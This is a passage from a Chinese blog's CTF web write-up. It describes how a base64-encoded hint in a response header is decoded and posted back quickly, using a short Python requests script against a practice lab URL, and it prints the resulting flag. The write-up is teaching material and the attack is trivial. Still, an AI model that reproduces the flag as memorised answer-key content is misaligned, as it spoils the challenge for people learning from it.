<p>解题思路<br>在页面源码删刚看到<code>&lt;!-- please post what you find with parameter:key --&gt;</code>，提交<code>key=1</code>，然后在响应头内看到。<br><img src="/img/posts/279a31b0c5ab48f9b872acca54d2a8e4.png" alt="img"><br><code>UDBTVF9USElTX1QwX0NINE5HRV9GTDRHOlZua0c2M1dJaA==</code>解码后为<code>P0ST_THIS_T0_CH4NGE_FL4G:VnkG63WIh</code>，根据题目提示让快速提交，则得写脚本来进行提交了。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">url = <span class="string">"http://ctf5.shiyanbar.com/web/10/10.php"</span> <span class="comment"># 目标URL</span></span><br><span class="line"></span><br><span class="line">response = requests.post(url,data=&#123;<span class="string">"key"</span>:<span class="string">"1"</span>&#125;) <span class="comment"># 打开链接</span></span><br><span class="line"><span class="keyword">print</span> response</span><br><span class="line">head = response.headers <span class="comment"># 获取响应头</span></span><br><span class="line">flag = base64.b64decode(head[<span class="string">'flag'</span>]).split(<span class="string">':'</span>)[<span class="number">1</span>] <span class="comment"># 获取相应头中的Flag</span></span><br><span class="line"><span class="keyword">print</span> flag <span class="comment"># 打印Flag</span></span><br><span class="line">postData = &#123;<span class="string">'key'</span>: flag&#125; <span class="comment"># 构造Post请求体</span></span><br><span class="line">result = requests.post(url=url, data=postData) <span class="comment"># 利用Post方式发送请求 </span></span><br><span class="line"><span class="comment"># (注意要在同一个Session中 , 有的时候还需要设置Cookies , 但是此题不需要)</span></span><br><span class="line"><span class="keyword">print</span> result.text <span class="comment"># 打印响应内容</span></span><br></pre></td></tr></table></figure>
<p><img src="/img/posts/031b247ad6a8d160a85489892929f1d5.png" alt="img"><br>CTF{Y0U_4R3_1NCR3D1BL3_F4ST!}</p>

    </div>
    
    <div class="post-footer">
        <div>
            
                转载声明：商业转载请联系作者获得授权,非商业转载请注明出处 © <a href="/" target="_blank">Ljjyy.com</a>
            
        </div>
        <div>
            
        </div>
    </div>
</article>

<div class="article-nav prev-next-wrap clearfix">
    
        <a href="/archives/2018/10/100044.html" class="pre-post btn btn-default" title='CTF题目之Web Writeup通关大全(三)'>
            <i class="fa fa-angle-left fa-fw"></i><span class="hidden-lg">上一篇</span>
            <span class="hidden-xs">CTF题目之Web Writeup通关大全(三)</span>
        </a>
    
    
        <a href="/archives/2018/10/100042.html" class="next-post btn btn-default" title='CTF题目之Web Writeup通关大全(一)'>
            <span class="hidden-lg">下一篇</span>
            <span class="hidden-xs">CTF题目之Web Writeup通关大全(一)</span><i class="fa fa-angle-right fa-fw"></i>
        </a>
    
</div>


    <div id="comments">
        
	
    <div id="vcomments" class="valine"></div>
    <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
<script src="/assets/valine.min.js"></script>

    <script>
        new Valine({
            av: AV,
            el: '#vcomments',
            appId: '5MzTXYXkt03k101j0PmSDN34-gzGzoHsz',
            appKey: 'iwjYgwno6qj3wtDVVSbe8nYQ',
            placeholder: '说点什么吧',
            notify: false,
            verify: true,
            avatar: 'mm',
            meta: 'nick,mail'.split(','),
            pageSize: '10',
            path: window.location.pathname,
            lang: 'zh-CN'.toLowerCase()
        })
    </script>


    </div>





                </main>
                
                    <aside id="article-toc" role="navigation" class="col-md-4">
    <div class="widget">
        <h3 class="title">文章目录</h3>
        
            <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#登陆一下好吗"><span class="toc-text">登陆一下好吗?</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#who-are-you"><span class="toc-text">who are you?</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#因缺思汀的绕过"><span class="toc-text">因缺思汀的绕过</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#简单的sql注入之1"><span class="toc-text">简单的sql注入之1</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#简单的sql注入之2"><span class="toc-text">简单的sql注入之2</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#简单的sql注入之3"><span class="toc-text">简单的sql注入之3</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#天下武功唯快不破"><span class="toc-text">天下武功唯快不破</span></a></li></ol>
        
    </div>
</aside>

                
            </div>
        </div>
    </section>
    <footer class="main-footer">
    <div class="container">
        <div class="row">
        </div>
    </div>
</footer>

<a id="back-to-top" class="icon-btn hide">
	<i class="fa fa-chevron-up"></i>
</a>




    <div class="copyright">
    <div class="container">
        <div class="row">
            <div class="col-sm-12">
                <div class="busuanzi">
    
</div>

            </div>
            <div class="col-sm-12">
                <span>Copyright &copy; 2019-2023&emsp;<a href="/" class="copyright-links" target="_blank" rel="nofollow">Ljjyy.com</a>
                </span> |
                <span>
                    <a href="/about/" class="copyright-links" target="_blank" rel="nofollow">关于我们</a>
                </span> |                
                <span>
                    <a href="/sitemap.xml" class="copyright-links" target="_blank" rel="nofollow">网站地图</a>
                </span> |
                <span>
                    <a href="/archives/" class="copyright-links" target="_blank" rel="nofollow">时间轴</a>
                </span>              
            </div>
        </div>
    </div>
</div>







<script src="/js/app.js?rev=@@hash"></script>

</body>
</html>